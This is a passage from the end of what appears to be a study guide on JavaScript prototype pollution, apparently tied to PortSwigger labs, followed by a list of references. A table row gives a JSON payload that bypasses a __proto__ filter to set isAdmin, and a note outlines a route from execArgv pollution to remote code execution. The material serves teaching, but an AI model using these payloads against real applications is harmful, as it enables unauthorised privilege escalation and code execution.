| Bypass a __proto__ filter | `{"constructor":{"prototype":{"isAdmin":true}}}` | Processing permits constructor.prototype traversal. |

For RCE, distinguish **the pollution request** from **the process-creation trigger**. In the final lab, after sending `execArgv`, the missing step is running maintenance jobs.

---

## IX. References

- [PortSwigger — Prototype Pollution](https://portswigger.net/web-security/prototype-pollution).
- [PortSwigger — JavaScript prototypes and inheritance](https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance).
- [PortSwigger — Client-side Prototype Pollution](https://portswigger.net/web-security/prototype-pollution/client-side).
- [PortSwigger — Prototype Pollution via browser APIs](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis).
- [PortSwigger — Server-side Prototype Pollution](https://portswigger.net/web-security/prototype-pollution/server-side).
- [MDN — JavaScript Prototype Pollution](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution).
- [MDN — Object.defineProperty()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty).
- [Node.js — Child process](https://nodejs.org/api/child_process.html).
- [OWASP — Prototype Pollution Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html).
